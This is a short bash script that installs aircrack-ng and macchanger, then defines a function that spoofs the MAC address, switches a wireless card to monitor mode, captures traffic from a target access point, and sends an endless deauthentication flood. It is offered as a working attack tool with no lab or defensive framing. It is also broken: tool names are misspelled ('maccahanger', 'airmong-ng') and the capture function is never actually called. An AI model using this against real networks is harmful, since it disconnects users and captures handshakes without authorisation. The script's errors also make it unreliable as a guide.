#! /bin/bash
source .env 

cat /etc/os-release > check_Os
source check_Os

apt install realtek-rtl88xxau-dkms #USB C

install (){
    if [[ "$ID_LIKE" == "debian" ]]
    then
        apt update && apt upgrade -y
        apt install macchanger net-tools aircrack-ng
    elif [[ "$ID_LIKE" == "arch" ]]
    then
        pacman -Syu
        pacman -S macchanger net-tools aircrack-ng
    else
        echo "what kind of f*uck*ng OS do you have ?"
    fi
}
install

iwconfig
capture () {
    ifconfig wlan0 down
    maccahanger wlan0 -r
    iwconfig wlan0 mode monitor
    airmong-ng 
    airodump-ng -w capture_of`date +%Y-%m-%d-%H-%M` -c 2 --bssid xx:xx:xx:xx:xx:xx wlan0mon
    aireplay-ng --deauth 0 -a xx:xx:xx:xx:xx:xx wlan0mon
}

install capture
